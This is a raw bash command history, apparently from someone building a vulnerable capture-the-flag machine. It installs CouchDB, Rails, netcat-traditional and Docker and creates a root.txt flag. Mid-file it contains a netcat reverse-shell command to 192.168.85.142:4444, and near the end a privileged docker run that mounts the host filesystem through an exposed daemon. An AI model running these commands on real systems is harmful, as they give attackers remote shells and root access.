sudo -s
cd /etc/apt/
rm sources.
rm sources.list
wget https://gist.githubusercontent.com/rohitrawat/60a04e6ebe4a9ec1203eac3a11d4afc1/raw/fcdfde2ab57e455ba9b37077abf85a81c504a4a9/sources.list
apt-get update
apt-get dist-upgrade 
sudo apt-get install software-properties-common
sudo add-apt-repository ppa:couchdb/stable
sudo apt-get update
sudo apt-get install couchdb
sudo chown -R couchdb:couchdb /usr/bin/couchdb /etc/couchdb /usr/share/couchdb
sudo chmod -R 0770 /usr/bin/couchdb /etc/couchdb /usr/share/couchdb
sudo systemctl restart couchdb
curl localhost:5984
apt install curl
curl localhost:5984
nano /etc/couchdb/local.ini
$ sudo systemctl restart couchdb
sudo systemctl restart couchdb
sudo firewall-cmd --zone=public --add-port=5984/tcp --permanent
sudo apt-get install build-essential curl nodejs
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
curl -sSL https://get.rvm.io | bash -s stable --ruby
curl -sSL https://rvm.io/mpapis.asc | sudo gpg --import -
curl -sSL https://rvm.io/pkuczynski.asc | sudo gpg --import -
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
curl -sSL https://get.rvm.io | bash -s stable --ruby
source /usr/local/rvm/scripts/rvm
rvm list known
rvm install 2.2
rvm use 2.2 --default
gem install rails -v 5.0
gem install rails -v 4.1
cd /root/
ls
mkdir railsflag
cd railsflag/
ls
rails new flag
ls
cd flag/
ls
rails -s
nestat -antl
netstat -antl
rails server
gem 'sqlite3'
gem install sqlite3
ls
nano Gemfile
rails server
nano Gemfile
rails server
bundle install
rails server
apt-get remove netcat-openbsd 
apt-get install netcat-traditional 
rails server
nc -e /bin/sh 192.168.85.142 4444
rails server
cd ..
ls
gem unistall rails -v 4.1
gem remove rails -v 4.1
gem uninstall rails
rvm install 2.3
gem unistall rails -v 5.0.1
gem install rails -v 5.0.1
gem install sprockets -v 3.7.2
gem install rails -v 5.0.1
cd ..
rm -r railsflag/
mkdir railflag/
cd railflag/
ls
rails new flag
ls
cd flag/
ls
rails s
rails s -b '0.0.0.0'
nano Gemfile
rails s -b '0.0.0.0'
bundle install
rails s -b '0.0.0.0'
gem unistall rails -v 5.0.1
gem uninstall rails -v 5.0.1
gem uninstall rails
gem install rails -v 5.0.0
ls
rails -s
cd ..
rm -r railflag/
rails new flag
rails
rails -v
ls
cd  flag/
ls
nano Gemfile
rails -s
rails s
gem uninstall rails
cd ..
ls
rm flag/
rm -r flag/
ls
rails _5.0.0_ new flag
gem uninstall rails
rail s
rails s
rails -v
gem uninstall rails
rails -v
apt-get remove rails
gem uninstall rails
rails 
rails -v
gem list rails --local
ls
rm -r flag/
rails _5.0.0_ new flag
cd flag/
cat Gemfile
rails s
rails --version
rails 
apt-get remove rails
reboot
ip addr
apt-get install ssh
sudo apt-get install ssh
ls
gem uninstall rails 
gem
gem unistall rails
rvm
ls
netstat -antl
apt-get remove rails
rails
rails -v
ls
netstat -antl
sudo apt-get install docker
sudo service docker status
sudo reboot
ps aux
ip addr
ls
cd /root
ls
cd flag/
ls
cd ..
rm -r flag/
apt-get remove redis
nano root.txt
exit
sudo deluser USERNAME sudo
sudo deluser atena sudo
exit
sudo -s
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
uname -a
exit
